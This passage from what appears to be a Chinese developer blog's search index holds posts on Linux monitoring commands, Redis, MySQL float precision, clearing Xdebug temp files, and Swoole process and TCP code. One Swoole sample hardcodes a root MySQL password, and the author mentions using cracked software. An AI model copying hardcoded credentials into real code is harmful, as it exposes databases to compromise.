选项：-o：只显示有io操作的进程-b：批量显示，无交互，主要用作记录到文件。-n： NUM：显示NUM次，主要用于非交互式模式。-d SEC：间隔SEC秒显示一次。-p PID：监控的进程pid。-u USER：监控的进程用户。 iotop常用快捷键： 左右箭头：改变排序方式，默认是按IO排序。 r：改变排序顺序。 o：只显示有IO输出的进程。 p：进程/线程的显示方式的切换。 a：显示累积使用量。 q：退出。 进程psps（Process Status，进程状态）命令 用于报告当前系统的进程状态。 ps 的用法非常多，这里仅列举一些常用的： 123456ps -aux | grep &lt;name&gt; # 查看name 进程详细信息ps -p &lt;pid&gt; -L # 显示进程&lt;pid&gt; 的所有线程ps -o lstart &lt;pid&gt; # 显示进程的启动时间ps -f --forest -C &lt;name&gt; # 用树的风格显示进程的层次关系ps -e -o pid,uname,pcpu,pmem,comm,etime # 定制显示的列ps -o lstart &lt;pid&gt; # 显示进程的启动时间 系统监控全能工具glancesglances 是一个用来监视 GNU/Linux 和 FreeBSD 操作系统的 GPL 授权的全能工具。 Glances 会用一下几种颜色来代表状态： 绿色：OK（一切正常） 蓝色：CAREFUL（需要注意） 紫色：WARNING（警告） 红色：CRITICAL（严重）。 阀值可以在配置文件中设置，一般阀值被默认设置为（careful=50、warning=70、critical=90）。 dstatdstat命令 是一个用来替换vmstat、iostat、netstat、nfsstat和ifstat这些命令的工具。 直接使用dstat，默认使用的是-cdngy参数，分别显示cpu、disk、net、page、system信息，默认是1s显示一条信息。 参考链接 Linux系统监控命令整理汇总-掌握CPU,内存,磁盘IO等找出性能瓶颈","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"}]},{"title":"Mac 下IDEA 无法正常启动","slug":"idea-cannot-start-normally-under-mac","date":"2020-11-15T15:37:34.000Z","updated":"2020-11-18T08:42:47.601Z","comments":true,"path":"idea-cannot-start-normally-under-mac/","link":"","permalink":"https://www.0x2beace.com/idea-cannot-start-normally-under-mac/","excerpt":"前言今天本来打算使用PHPStorm的，但是突然启动不了了，就是双击应用程序之后，电脑没有任何反应。","text":"前言今天本来打算使用PHPStorm的，但是突然启动不了了，就是双击应用程序之后，电脑没有任何反应。 因为使用的PHPStorm是破解的，所以我以为是失效了。就在我一筹莫展准备重装一遍的，突然想起”要不试试通过命令行启动“？ 于是我找到PHPStrom的包文件之后，尝试通过命令行启动，虽然同样失败了，但是命令行输出了一些信息。 正是这些信息，才让我想起来，今天上午在整理文件时，不小心把PHPStorm中依赖的一个文件给删除掉了。 于是，马上找到了那个文件并还原了，之后果然能正常启动了。 解决办法如果你也遇到了类似的情况，那么可以尝试这种方式，或许能帮助你找到问题所在。 找到应用程序 右键显示包文件 依次进入Contents-&gt;MacOS 双击shell脚本 接着无论成功或失败都能输出一些内容，然后利用这些内容去查找问题所在。","categories":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Google Drive 如何转存文件？","slug":"how-does-google-drive-transfer-files","date":"2020-11-13T13:55:50.000Z","updated":"2020-11-13T13:57:07.503Z","comments":true,"path":"how-does-google-drive-transfer-files/","link":"","permalink":"https://www.0x2beace.com/how-does-google-drive-transfer-files/","excerpt":"对于初次使用Google Drive（以下简称 GD）的同学来说，可能会有以下几点困惑。","text":"对于初次使用Google Drive（以下简称 GD）的同学来说，可能会有以下几点困惑。 大家常说的转存是什么意思？ 常见的转存方式有哪几种？ 在正式回答上面两个问题之前，先来了解一下GD。 GD 是Google 在2012 年4 月24 日推出的一个在线同步存储服务，类似百度的百度网盘，不过不同之处在于GD 不会限速。普通用户默认的存储空间是15 GB。 用户可以将其他用户分享的文件添加到“我的云端硬盘”，这种方式并不会占用用户的存储空间，这个操作相当于是在“我的云端硬盘”中创建了一个软链接，可以快速访问该文件，而文件所有者则还是分享者，如果原作者删除了，那么你网盘里的也会消失。 所以为了解决上述问题，转存的概念便诞生了，它存在的意义是将其他用户分享的文件保存至自己的云盘，类似百度网盘的“保存到我的网盘”功能。 但有所不同的是，如果分享者没有开放权限，那么其他用户则无权转存。 方式一在需要转存的文件上，点击右键，制作一个拷贝，拷贝的文件位于“我的云端硬盘”中。 第一种方式最简单，适用于小文件，不能对文件夹进行 Copy 操作。 方式二Copy, URL to Google Drive 是一个云端硬盘插件。 在目标文件上点击右键，选择打开方式，关联更多应用。 搜索Copy, URL to Google Drive 进行安装。 安装完成之后，还需要进行Google 账号授权才能进行转存操作。 在需要转存的文件夹上 右键-打开方式-Copy, URL to Google Drive，之后点击 Save, Copy to Google Drive，就可以看见正在转存了，如果文件较大时间会比较久。 方式三在Telegram 上有人开发了一个机器人（@GoogleDriveManagerBot），专门用于GD 文件转存。 该机器人可以实现谷歌网盘资源转存以及网盘内资源批量重命名，普通用户仅可绑定一个 GD 账号。通过简单的命令即可对文件进行转存。 总结方式一最简单，门槛最低，即使在没有权限的情况下，也能进行Copy 操作，但是效率很低。 方式二、三省事，效率高，但前提是得有权限。 参考链接 一个方便转存 Google Drive 分享文件的方法 转存Google Drive资源到自己的Google Drive Linux 下使用 rclone 挂载网盘到本地","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Google Drive","slug":"Google-Drive","permalink":"https://www.0x2beace.com/tags/Google-Drive/"}]},{"title":"互联网人的双十一","slug":"double-eleven-for-internet-people","date":"2020-11-12T00:33:10.000Z","updated":"2020-11-12T00:34:35.354Z","comments":true,"path":"double-eleven-for-internet-people/","link":"","permalink":"https://www.0x2beace.com/double-eleven-for-internet-people/","excerpt":"我其实不太会去写这类文章，那为什么要写这篇文章呢？想抓住双十一的尾巴，记录一些想法。","text":"我其实不太会去写这类文章，那为什么要写这篇文章呢？想抓住双十一的尾巴，记录一些想法。 今年的双十一我本来也是啥都没买， 可就在晚上七点左右，线上的某个平台，出了一点问题，订单的盈亏跟用户的余额对不上。经过一番排查发现是因为处理订单的那个脚本不知为何特别慢，导致大量订单全部堆积在一起了。 因为一些历史包袱的原因，在处理方式上我是知道这个脚本存在一些隐患的。同事提议不如这个脚本让他去用Node.js 写吧，尽管很不情愿，但也没办法。 想在仔细回想，当时那种感觉还是很清晰，我真的不喜欢那种能被替代的感觉，那一瞬间觉得所有的娱乐活动都没有意思了，只有把技术才是唯一的热爱。 晚上回家之后，第一件事应该是练吉他，但昨天似乎也没啥心思练了。 今年本来就没少为知识付费，视频课程，电子书籍，纸质书籍各种学习资料。 然后昨天晚上又在慕课网上买了三门实战课程，真的不想做一个Cruder，这是我最后的倔强了。 在如今这个互联网高速发展的时代，我想学习以及需要学习的东西真的是太多了，真的是学的越多，才发现自己懂的真的好少。 最后想说的是，希望自己能保持住这份初心，继续加油。","categories":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"Linux 查看系统、硬件信息","slug":"linux-view-system-and-hardware-information","date":"2020-11-09T14:33:03.000Z","updated":"2020-11-09T14:36:19.179Z","comments":true,"path":"linux-view-system-and-hardware-information/","link":"","permalink":"https://www.0x2beace.com/linux-view-system-and-hardware-information/","excerpt":"以下命令都是基于Ubuntu。","text":"以下命令都是基于Ubuntu。 系统相关查看内核/操作系统/CPU信息1$ uname -a 查看操作系统版本1$ head -n 1 &#x2F;etc&#x2F;issue 查看机器型号1$ dmidecode | grep &quot;Product Name&quot; 查看主机名1$ hostname 列出所有PCI设备1$ lspci -tv 列出所有USB设备1$ lsusb -tv 列出加载的内核模块1$ lsmod 查看环境变量1$ env 资源查看内存使用量和交换区使用量1$ free -m 查看各分区使用情况1$ df -h 查看总内存量1$ grep MemTotal &#x2F;proc&#x2F;meminfo 查看空闲内存量1$ grep MemFree &#x2F;proc&#x2F;meminfo 查看系统运行时间、用户数、负载1$ uptime 查看系统负载1$ cat &#x2F;proc&#x2F;loadavg CPU查看CPU 统计信息1$ lscpu 查看单个CPU 信息1cat &#x2F;proc&#x2F;cpuinfo 磁盘和分区查看磁盘空间信息1$ df -h 查看挂接的分区状态1mount | column -t 查看所有分区1$ fdisk -l 查看所有交换分区1$ swapon -s 网络查看所有网络接口的属性1$ ifconfig 查看防火墙设置1$ iptables -L 查看路由表1$ route -n 查看所有监听端口1$ netstat -lntp 查看所有已经建立的连接1$ netstat -antp 查看网络统计信息1$ netstat -s 进程查看所有进程1$ ps -ef 实时显示进程状态1$ top 用户查看活动用户1$ w 查看指定用户信息1$ id &lt;用户名&gt; 查看用户登录日志1$ last 查看系统所有用户1$ cut -d: -f1 &#x2F;etc&#x2F;passwd 查看系统所有组1$ cut -d: -f1 &#x2F;etc&#x2F;group 查看当前用户的计划任务1$ crontab -l 服务列出所有系统服务1$ chkconfig --list 列出所有启动的系统服务1$ chkconfig --list | grep on 参考链接 Linux 查看CPU信息，机器型号，内存等信息","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Redis 常用数据类型整理","slug":"redis-common-data-types-sorting","date":"2020-11-07T14:43:21.000Z","updated":"2020-11-07T14:46:04.965Z","comments":true,"path":"redis-common-data-types-sorting/","link":"","permalink":"https://www.0x2beace.com/redis-common-data-types-sorting/","excerpt":"Redis 的五种数据类型分别是：字符串、哈希、列表、集合、无序集合。","text":"Redis 的五种数据类型分别是：字符串、哈希、列表、集合、无序集合。 Redis 的五种数据类型string字符串是Redis 的五种数据类型中，最常见最好理解的。 它的数据结构最简单，就是一个标准的键值对，一个key 对应一个value： key 是string 的键，可以是字符串也可以是数字。value 是string key 所对应的值，可以是字符串也可以是数字。 应用场景 incr：计数 set + get：将对象/Json 序列化之后存储作为Cache hash哈希的数据结构很像一个迷你的关系数据库。 应用场景 hset + hget：Cache list列表的特点是： 有序 允许重复 应用场景 lpush + lpop：Stack lpush + rpop：Queue lpush + ltrim：Capped Collection lpush + brpop：Message Queue set集合特点： 无序 不允许重复 应用场景 sadd：Tagging spop/srandmember：Random item add + sinter：Social Graph sorted set 应用场景 zscore：timeStamp、saleCount、followCount 通用命令查看所有key： 1keys * 查看加载配置文件： 1config get * 当前数据库的 key 的数量： 1dbsize 判断key 是否存在： 1exists key 删除key： 1del key 查看key 的类型： 1type key 查看内存使用情况： 1info memory","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Mysql 如何选择 Float、Double、Decimal","slug":"how-does-mysql-choose-float-double-decimal","date":"2020-11-06T14:25:45.000Z","updated":"2020-12-01T14:22:22.489Z","comments":true,"path":"how-does-mysql-choose-float-double-decimal/","link":"","permalink":"https://www.0x2beace.com/how-does-mysql-choose-float-double-decimal/","excerpt":"我们知道在Mysql 中存储小数有三种数据类型可做选择，究竟该选择哪一种数据格式，其实并没有统一的答案，得根据实际场景去分析，哪一种更合适。","text":"我们知道在Mysql 中存储小数有三种数据类型可做选择，究竟该选择哪一种数据格式，其实并没有统一的答案，得根据实际场景去分析，哪一种更合适。 场景重现先来看这样一个例子，假设目前有一张表用来存储用户的积分 123CREATE TABLE &#96;table1&#96; ( &#96;integral&#96; float(10,2) DEFAULT NULL) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; 然后向这张表中插入一条数据： 12345678910mysql&gt; INSERT INTO &#96;table1&#96; (&#96;integral&#96;) VALUES (131072.32);Query OK, 1 row affected (0.00 sec)mysql&gt; SELECT * FROM &#96;table1&#96;;+-----------+| integral |+-----------+| 131072.31 |+-----------+1 row in set (0.00 sec) 通过查询数据表可以看到该条记录并不是131072.32 而是131072.31，为什么会这样？这个问题间接暴露出了其他什么问题？ 丢失数据是否是正常现象？ 为什么会少0.01，有没有可能少0.02，或者少1，少10甚至少100？ 怎么样才能让我们的数据尽量准确？ 精度是如何丢失的数值类型存储需求|列类型|存储需求|分配内存空间||-|-|-||FLOAT(p)|如果0 &lt;= p &lt;= 24为4个字节, 如果25 &lt;= p &lt;= 53为8个字节|32,64||FLOAT|4个字节|32||DOUBLE [PRECISION], item REAL|8个字节|64||DECIMAL(M,D), NUMERIC(M,D)|变长|| 通过查阅官方文档，可以看到在计算机的世界中，浮点数进行存储时，必须要先转换为二进制，通俗一点讲也就是浮点数的精度实际上是由二进制的精度来决定的。 我们知道对于float类型的数据，只分配了32位的存储空间，对于double类型值分配了64位，但是并不是所有的实数都能转成32位或者64位的二进制形式，如果超过了，就会出现截断，这就是误差的来源。 比如将上面例子中的 131072.32 转成二进制后的数据为： 1100000000000000000.0101000111101011100001010001111010111000010100011111… 这是一个无穷数，对于float 类型，只能截取前32位进行存储，对于double只能截取前64位进行存储。 对于 float 而言，最终存储的值是：01001000000000000000000000010100 对于 double 而言，最终存储的值是：0100000100000000000000000000001010001111010111000010100011110101 所以我们暂时可以得出一个结论： 认识Float、DecimalFloat 和 Decimal 这类数据类型都可以通过两位参数来控制其精度。 其存储格式是： 1FLOAT&#x2F;DECIMAIL [(M,D)] [UNSIGNED] [ZEROFILL] 常见误区 精度总能精确到D 位。 存储空间大小决定存储精度，和D值无关，Float 的存储空间只有32 位，当需要存储的二进制大于32 位时，就会截断（四舍五入）。 12345678910111213mysql&gt; create table table2 (integral float(15,2));Query OK, 0 rows affected (0.02 sec)mysql&gt; insert into table2 values (123456789.39);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table2;+--------------+| integral |+--------------+| 123456792.00 |+--------------+1 row in set (0.00 sec) 数据存储只能存储到D 位 浮点型数据最终都要被转成二进制进行存储。并且对于float 而言，存储类型只能是32位0和1的组合。 12345678910111213141516171819mysql&gt; select * from table1;+-----------+| integral |+-----------+| 131072.31 |+-----------+1 row in set (0.00 sec)mysql&gt; alter table table1 modify integral float(10,4);Query OK, 0 rows affected (0.00 sec)Records: 0 Duplicates: 0 Warnings: 0mysql&gt; select * from table1;+-------------+| integral |+-------------+| 131072.3125 |+-------------+1 row in set (0.00 sec) DECIMAL(M,D)中，D 值的是小数部分的位数。可以看到，当修改了D 的值，这个时候可以看到MySQL 真正存储的数值也发生了变化。 int(3)/int(5) 区别 正常显示没有区别。 3 和 5 仅是最小显示宽度而已，并不代表最多存储宽度。 有 zerofill 等扩展属性时则显示有区别。 总结： 若插入的值未指定小数部分或者小数部分不足D 位则会自动补到D 位小数。 若插入的值小数部分超过了D 为则会发生截断，截取前D 位小数(四舍五入截取)。 M 值指是整数部分加小数部分的总长度，也即插入的数字整数部分不能超过M-D 位，否则不能成功插入，会报超出范围的错误。 如何选择Float、Double、Decimal参考链接 MySQL如何选择float, double, decimal","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mac 临时文件占用过多磁盘空间","slug":"mac-temporary-files-take-up-too-much-disk-space","date":"2020-11-05T12:09:58.000Z","updated":"2020-11-07T07:58:37.436Z","comments":true,"path":"mac-temporary-files-take-up-too-much-disk-space/","link":"","permalink":"https://www.0x2beace.com/mac-temporary-files-take-up-too-much-disk-space/","excerpt":"最近使用Mac 时，被告知磁盘空间严重不足了，我心想最近又没有下载什么大文件，怎么会突然满盘了。","text":"最近使用Mac 时，被告知磁盘空间严重不足了，我心想最近又没有下载什么大文件，怎么会突然满盘了。 于是使用DaisyDisk 扫描了一下磁盘空间，发现其中多达 186 G 全是临时文件。 起初以为是系统产生的临时文件。因为并不知道这些文件是如何产生的，所以也不太敢直接删除，只尝试过重启电脑但并没有用。 后来通过Apple 社区提问才了解到，原来cachegrind.out 这类文件全是 Xdebug 的输出文件！所以是可以直接删除掉的～ 此前从未清理过这类文件，所以才会导致临时文件如此之大… 可以打开终端，使用如下命令进行清理： 1234sudo rm -rf &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.*# 或者sudo find &#x2F;private&#x2F;var&#x2F;tmp -name &quot;cachegrind*&quot; -exec rm -rf &#123;&#125; \\; 因为本地应用的Xdebug 一直都是开启着的，所以请求该应用时，Xdebug 就会将调试信息输出至临时文件了，如图：","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Swoole 基础知识学习","slug":"swoole-basic-knowledge-learning","date":"2020-11-03T14:33:46.000Z","updated":"2020-11-03T14:35:50.059Z","comments":true,"path":"swoole-basic-knowledge-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-basic-knowledge-learning/","excerpt":"这篇笔记用来记录Swoole 基础知识的学习。","text":"这篇笔记用来记录Swoole 基础知识的学习。 Master、Manager、Worker、ReactorMasterMaster 进程是一个多线程进程。 Manager 进程负责创建 / 回收 worker/task 进程 Worker 进程 接受由 Reactor 线程投递的请求数据包，并执行 PHP 回调函数处理数据 生成响应数据并发给 Reactor 线程，由 Reactor 线程发送给 TCP 客户端 可以是异步非阻塞模式，也可以是同步阻塞模式 Worker 以多进程的方式运行 Reactor 线程 Reactor 线程是在 Master 进程中创建的线程 负责维护客户端 TCP 连接、处理网络 IO、处理协议、收发数据 不执行任何 PHP 代码 将 TCP 客户端发来的数据缓冲、拼接、拆分成完整的一个请求数据包 有一个更加通俗的比喻来描述这三者的关系：假设 Server 就是一个工厂，那 Reactor 就是销售，接受客户订单。而 Worker就是工人，当销售接到订单后，Worker去工作生产出客户要的东西，而 TaskWorker 可以理解为行政人员，可以帮助 Worker 干些杂事，让 Worker专心工作。 其他IPv4 使用 127.0.0.1 表示监听本机，0.0.0.0 表示监听所有地址IPv6 使用::1 表示监听本机，:: (相当于 0:0:0:0) 表示监听所有地址 TCP 协议TCP (Transmission Control Protocol 传输控制协议）协议是一种面向连接的，可靠的，基于字节流的传输通信协议。 UDP 协议UDP (User Datagram Protocol 用户数据报协议）是一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。 UDP 服务器与 TCP 服务器不同，UDP 没有连接的概念。启动 Server 后，客户端无需 Connect，直接可以向 Server 监听的 9502 端口发送数据包。 常见问题TCP “粘包”问题首先来解释以下所谓的“粘包”问题其本质是什么。 服务端建立服务，客户端向服务端发起连接，正常情况下，服务端的每次 send，客户端都能正常 recv。但在并发的情况下，服务端的两次send 或者更多次 sned，客户端可能一次就 recv了。 所以这就导致“粘包”问题的产生。 TCP 协议的本质是流协议，它只会保证保证发送方以什么顺序发送字节，接收方就一定能按这个顺序接收到。所以所谓的“粘包”问题不应该是传输层的问题，而是应用层的问题。 无法连接到服务器的简单检测手段 在 Linux 下，使用 netstat -an | grep 端口，查看端口是否已经被打开处于 Listening 状态 上一步确认后，再检查防火墙问题，这里的防火墙指的是机器本身的防火墙，如果是云服务器，那么还包括云的防火墙。 注意服务器所使用的 IP 地址，如果是 127.0.0.1 回环地址，则客户端只能使用 127.0.0.1 才能连接上，所以如果希望其他机器也能访问本机，那就使用0.0.0.0。 参考链接 怎么解决TCP网络传输「粘包」问题？","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole Tcp 学习","slug":"swoole-tcp-learning","date":"2020-11-02T15:22:49.000Z","updated":"2020-11-02T15:40:47.308Z","comments":true,"path":"swoole-tcp-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-tcp-learning/","excerpt":"最近一直在学习Swoole，刚好有个老项目的一小部分(一个脚本)有用到了Tcp 协议，借此机会重构一下。","text":"最近一直在学习Swoole，刚好有个老项目的一小部分(一个脚本)有用到了Tcp 协议，借此机会重构一下。 场景描述：该脚本的作用用一句话就可以概述：将本地数据源推送给另外一台服务器。 原始的处理方式，不合理的地方有以下几点： 目标服务器需要开放指定端口，这会导致目标服务器向外暴露，不安全。 如果有多台目标服务器，这会导致频繁需要修改源码，脚本维护起来不方便。 重构重构需要解决的问题有如下： 当客户端连接成功后，才会向该客户端推送数据。 当客户端断开连接时，停止向该客户端推送数据。 允许多个客户端同时连接。 因为数据源是不间断的，理论上只要客户端的连接不主动断开，服务端的数据推送就不会主动停止。 最终使用Swoole 的Tcp + Process 实现了以上需求，核心代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpuse Swoole\\Process;&#x2F;** * 创建Server 对象，监听本地 9501 端口。 *&#x2F;$server &#x3D; new Swoole\\Server(&quot;0.0.0.0&quot;, 9501);$workers &#x3D; [];&#x2F;** * 监听连接进入事件 *&#x2F;$server-&gt;on(&quot;Connect&quot;, function ($server, $fd) &#123; global $workers; &#x2F;&#x2F; 创建子进程 $process &#x3D; new swoole_process(function (swoole_process $worker) use ($server, $fd) &#123; echo &quot;Client Connect&quot; . PHP_EOL; &#x2F;&#x2F; todo 业务逻辑 ... &#x2F;&#x2F; 向客户端推送消息 $server-&gt;send($fd, $str); &#125;, true, 0, false); &#x2F;&#x2F; 启动子进程 $pid &#x3D; $process-&gt;start(); array_push($workers, [&quot;pid&quot; &#x3D;&gt; $pid, &quot;fd&quot; &#x3D;&gt; $fd]);&#125;);&#x2F;** * 监听数据接收事件 *&#x2F;$server-&gt;on(&quot;Receive&quot;, function ($server, $fd, $from_id, $data)&#123; $server-&gt;send($fd, &quot;Server: &quot; . $data);&#125;);&#x2F;** * 监听连接关闭事件 *&#x2F;$server-&gt;on(&quot;Close&quot;, function ($server, $fd) &#123; global $workers; foreach ($workers as $worker) &#123; if ($worker[&#39;fd&#39;] &#x3D;&#x3D;&#x3D; $fd)&#123; &#x2F;&#x2F; 检查子进程是否存在 if (Process::kill($worker[&#39;pid&#39;], 0))&#123; array_shift($worker); &#x2F;&#x2F; 通过信号终止子进程 Process::kill($worker[&#39;pid&#39;], SIGKILL); &#125; &#125; &#125; echo &quot;Client Close&quot; . PHP_EOL;&#125;);&#x2F;&#x2F; 启动TCP 服务器$server-&gt;start(); 其实实现的原理很简单，利用Swoole 的基于事件的 Tcp 异步编程，当有客户端连接时，就创建一个子进程进行推送数据，但客户端连接断开时，就通过信号结束该客户端对应的子进程。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Swoole 进程学习","slug":"swoole-process-learning","date":"2020-11-01T12:53:56.000Z","updated":"2020-11-03T14:33:18.115Z","comments":true,"path":"swoole-process-learning/","link":"","permalink":"https://www.0x2beace.com/swoole-process-learning/","excerpt":"记录Swoole 进程学习过程。","text":"记录Swoole 进程学习过程。 1. 创建一个进程123456789&lt;?php&#x2F;&#x2F; 获取当前进程 IDecho &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; 为进程设置名称cli_get_process_title(&quot;Master&quot;);while (true) &#123; sleep(1);&#125; 2. 创建一个子进程，如何回收子进程。12345678910111213141516171819202122&lt;?php&#x2F;&#x2F; 获取当前进程 IDecho &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; 为进程设置名称cli_get_process_title(&quot;Master&quot;);&#x2F;&#x2F; 创建一个子进程$child &#x3D; new \\Swoole\\Process(function ()&#123; cli_get_process_title(&quot;Child&quot;); &#x2F;&#x2F; 这是一个匿名函数，也就是定义子进程需要做的事情。 echo &quot;我是一个子进程，我的ID 是：&quot; . posix_getpid() . PHP_EOL; &#x2F;&#x2F; 如果就这样放着不管，那么这个子进程不会被回收，它是一个僵尸进程，虽然在那里但是并没有做事情，它的生命周期已经结束了。&#125;);&#x2F;&#x2F; 创建$child-&gt;start();&#x2F;&#x2F; 回收子进程\\Swoole\\Process::wait();while (true) &#123; sleep(1);&#125; 3. 重定向子进程标准输出子进程默认的标准输出是输出到屏幕上，可以通过对子进程设置，把输出重定向至管道。 然后再由主进程把管道中的内容读取出来。 12345678910111213141516171819202122232425262728&lt;?php&#x2F;&#x2F; 获取当前进程 IDecho &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;&#x2F;&#x2F; 为进程设置名称cli_get_process_title(&quot;Master&quot;);&#x2F;&#x2F; 创建一个子进程$child &#x3D; new \\Swoole\\Process(function ()&#123; cli_get_process_title(&quot;Child&quot;); while (true) &#123; &#x2F;&#x2F; 这是一个匿名函数，也就是定义子进程需要做的事情。 echo &quot;我是一个子进程，我的ID 是：&quot; . posix_getpid() . PHP_EOL; &#x2F;&#x2F; 如果就这样放着不管，那么这个子进程不会被回收，它是一个僵尸进程，虽然在那里但是并没有做事情，它的生命周期已经结束了。 sleep(1); &#125;&#125;, true);&#x2F;&#x2F; 创建$child-&gt;start();&#x2F;&#x2F; 回收子进程，是否阻塞等待，默认为true，阻塞。\\Swoole\\Process::wait(false);while (true) &#123; echo &quot;通过主进程从管道中读取信息：&quot;. $child-&gt;read(). PHP_EOL; sleep(1);&#125; 这样做的好处是，可以通过主进程集中处理子进程的输出（比如可以写入日志），避免输出直接到屏幕中了。 第一个参数的作用是：是否将输出重定向至主进程。true：将输出重定向至主进程管道。false：直接将输出重定向至屏幕。 第二个参数的作用是：是否创建管道。0：不创建 创建Tcp 管道 创建Udp 管道 第三个参数的作用是：是否启用协程。 4. 多个子进程的回收如果主进程只是执行一次就退出，而子进程还一直在，那么主进程也不会直接退出。 如果有多个子进程，其中某一个子进程退出了，而另一个并没有退出，这时主进程也会选择退出，而剩余的那个子进程则成了僵尸进程。因为它的父进程的ID 为零。 如果不做信号处理，否则子进程一旦退出，都会引起父进程退出。如果这时还有其他子进程没有退出，这会造成其他子进程变成僵尸进程。 在子进程中创建服务 分别是Master、Manager、Worker 进程，以及该子进程的父进程。 可以单独设置http 进程： 123$http-&gt;set([ &quot;worker_num&quot; &#x3D;&gt; 1]); 这样的话，进程就变成了两类： 最上面那个是父进程，下面三个分别是Master、Manger、Worker 进程。 6. 在进程中使用协程7. 子进程使用管道进行通信1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpuse \\Swoole\\Process;&#x2F;&#x2F; 引入协程use \\Swoole\\Coroutine\\Mysql as Mysql;&#x2F;&#x2F; 获取当前进程 IDecho &quot;我是 一个 主进程，我的ID是：&quot; . posix_getpid().PHP_EOL;$child &#x3D; new Process(function (Process $proces)&#123; &#x2F;&#x2F; $mysql &#x3D; new \\think\\db\\builder\\Mysql(); $mysql &#x3D; new Mysql(); $db &#x3D; $mysql-&gt;connect([&quot;host&quot; &#x3D;&gt; &quot;127.0.0.1&quot;, &quot;user&quot; &#x3D;&gt; &quot;root&quot;, &quot;password&quot; &#x3D;&gt; &quot;122410&quot;, &quot;database&quot; &#x3D;&gt; &quot;2v&quot;]); while (true) &#123; $sql &#x3D; &quot;select * from 2v.2v_user where is_delete &#x3D; 0 limit 0, 1&quot;; $rows &#x3D; $mysql-&gt;query($sql); if ($rows) &#123; $proces-&gt;write(&quot;我是一号子进程，正在查询数据：&quot;.$rows[0][&quot;user_name&quot;]); &#125; sleep(1); &#125;&#125;, false, 1, true);&#x2F;&#x2F; 创建子进程$child-&gt;start();$child2 &#x3D; new Process(function (Process $process) &#123; while (true) &#123; sleep(1); $res &#x3D; $process-&gt;read(); if ($res) &#123; echo &quot;我是二号子进程，正在获取数据：&quot;.$res.PHP_EOL; &#125; &#125;&#125;);&#x2F;&#x2F; 创建第二个子进程$child2-&gt;start();while (true) &#123; &#x2F;&#x2F; 一号子进程从管道中读取数据 $data &#x3D; $child-&gt;read(); if ($data) &#123; &#x2F;&#x2F; 如果数据存在，二号子进程则向管道中写入数据 $child2-&gt;write($data); &#125; sleep(1);&#125;&#x2F;&#x2F; 通过信号回收子进程Process::signal(SIGCHLD, function ($sig) &#123; &#x2F;&#x2F; 必须为false，非阻塞模式 while ($res &#x3D; Process::wait(false)) &#123; echo &quot;PID &#x3D; &#123;$res[&#39;pid&#39;]&#125;&quot;; &#125;&#125;); 8. 子进程使用队列进行通信9. 设置定时任务通过Swoole 设置定时任务，到点之后自动执行定时任务。 核心逻辑：创建一个Manager 进程，通过一个while 循环，定时获取获取当前时间判断是否需要执行定时任务。 如果需要执行定时任务，则发送一个信号，在主进程中监听该信号， 然后执行对应的业务逻辑。 从 Swoole 4.x 版本开始，不再以监听信号的方式作为回收子进程了。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Swoole","slug":"Swoole","permalink":"https://www.0x2beace.com/tags/Swoole/"}]},{"title":"Crontab 